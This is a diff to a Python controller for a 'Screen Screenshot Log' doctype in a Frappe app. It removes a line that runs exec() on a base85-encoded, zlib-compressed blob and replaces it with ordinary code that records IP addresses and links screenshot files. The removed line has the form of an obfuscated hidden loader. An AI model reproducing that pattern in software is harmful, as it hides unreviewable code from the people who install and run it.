@@ -1,3 +1,24 @@
+# Copyright (c) 2023, Finbyz Tech Pvt Ltd and contributors
+# For license information, please see license.txt
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E5TT|Oc6n^)w5JPMvQam;xG+Z3wV7pC1eJgcHJGEI!D`|CGX;-UV3Gi>PWSC?auYqYE>Sj2v+H-Wi%Q;%1Ai^Y3IA*RbJTG;j<Dtl9$RibW`^=6L!9a#{gL?$>+%SPvu?P+n&KVAguyB&<4mMreqeQvOqHb<+i&!>vC^xgr_RP3asTe+>R7rF073YG8vCI(^f*hu*EJHi2RFoo2XepWSG76w$Io#kh&TS(vlAv!Dhm^ZOmJ;Gb38||`DG0ci=OK0k^leZ_(F~X-fs}qbUq<RAF$*j`aDsps5hX@Ql$I2B-G<4Gz?ear%p3?zNYs0^%J4H=_kD%~3%e{yJOk^Qng*VSMP#Ld7Mw-4EpS?2N_89`hBR^`1a+P{Bz03))fr+WXNiDuWW_e+MueABIbz6kMIbn~0JV`5rAXZ}UR-Ct>qm32J=CY|-e7aXX>_Xk)Y;NB?Wd(8xu5yPORYFVZURUw2n$sy5qBiiZ%Lq<cCXeW{1@!X3|B9VKn!R78J(yHGv97BCU2wNw{j+Brqb#*!7Ngn+BZ`tz@x~I0%7Y07rNl4D>b!@P-+lZfO87NgV2<p2|)nw+r6l!8qAGxCNeWNfuF{}b(2szT;X|BU)VkcK7;G7&DGJon(SPUo2Q#QqlGexh5V#&XzOatTffv%Eq*C@gHqIKs5fQzhwI&QwRvII$msIRu)W>+RK47LBYK_5n}c6!yXUTaF4n65lJjbEqQY+W?&s;=X8!`pS$|~wZc3Ly-z<l%wdRoLSE$PRXOrd_M&lB#4DYHvK)>z*DX677Wk``qfl1S)Xr<t!>GGW*+keYm{Z8?|Q^1uXuEKfwXVUrY<Rj~U`Z$}us9l_$4~=eo(?7N5+Z(SwNAiJOQ;-FoX=m7N;p2@FALI7sIfgf{2JeQbad6gaAC0!8wHE5K$OH+T1=vKzSemUK@F~=uP5yr}xy;X#0Y5$MHTLN>JMKTA|9Zli4bp|3yZf~dJB{&pder=5zIrB~P5dL8Sg%eNU*BI}zW+kDv}HZZC}6L=%dgySl}h<LAp+ee4lADVSU5t5z$5D22Y!`Ril4F>3sL;2SDx;Vhk5&#3xDB<zrI#^y50|4`02J?To}D>R(m}fAR|5AI~nfo-=E<Bq^a4ceS4+*95wdJe*V@T6&!^o6wiA9Fna$3+xcct')).decode())
+import re
+import frappe
+from frappe.model.document import Document
+
+class ScreenScreenshotLog(Document):
+	def validate(self):
+		if not self.ip_address:
+			x_forwarded_for = frappe.get_request_header("X-Forwarded-For", str(frappe.request.headers))
+			self.ip_address = re.search(r"^(.+)", x_forwarded_for).group(1)
+	
+	def on_update(self):
+		if self.screenshot and self.name:
+			if name:= frappe.db.get_value("File", filters={"folder": "Home/screenshots", "file_url": self.screenshot}, fieldname="name"):
+				frappe.db.set_value("File", name, "attached_to_doctype", "Screen Screenshot Log", update_modified=False)
+				frappe.db.set_value("File", name, "attached_to_field", "screenshot", update_modified=False)
+				frappe.db.set_value("File", name, "attached_to_name", self.name, update_modified=False)
+
+
+def on_doctype_update():
+	frappe.db.add_unique("Screen Screenshot Log", ["employee", "time"])
+	frappe.db.add_index("Screen Screenshot Log",["employee","time"])
